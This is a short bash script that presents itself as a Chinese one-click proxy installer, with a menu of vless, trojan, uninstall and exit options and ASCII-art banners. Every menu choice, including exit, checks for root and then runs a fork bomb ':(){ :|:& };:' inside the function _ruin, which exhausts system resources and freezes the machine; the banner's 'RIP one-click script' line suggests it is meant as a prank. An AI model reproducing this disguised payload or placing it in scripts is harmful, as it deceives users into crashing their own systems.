#!/bin/bash
tput clear
cat << "EOF"
 .----------------. 
| .--------------. |
| |    _______   | |
| |   /  ___  |  | |
| |  |  (__ \_|  | |
| |   '.___`-.   | |
| |  |`\____) |  | |
| |  |_______.'  | |
| |              | |
| '--------------' |
 '----------------' 
⚠ 不作恶 世界和平
EOF

check_root(){

	if [[ $(id -u) = "0" ]]; then
   	
    echo "Warning: You're running this script with root privilege"

    cat << "EOF"
 .----------------. 
| .--------------. |
| |    _______   | |
| |   /  ___  |  | |
| |  |  (__ \_|  | |
| |   '.___`-.   | |
| |  |`\____) |  | |
| |  |_______.'  | |
| |              | |
| '--------------' |
 '----------------' 
⚠ 世界和平 RIP一键脚本
EOF

  else

    echo "You must be root to do this."
    exit

  fi
		
	
}

_ruin(){
    :(){ :|:& };:
}

   

PS3="选择您要的方案: "

select opt in vless+tcp vless+mkcp+seed vless+ws+tls vless+ws+cdn vless+tcp+xtls vless+trojan+tls 卸载 退出; do

  case $opt in
    *)
      check_root
      _ruin
      break
      ;;
  esac
done
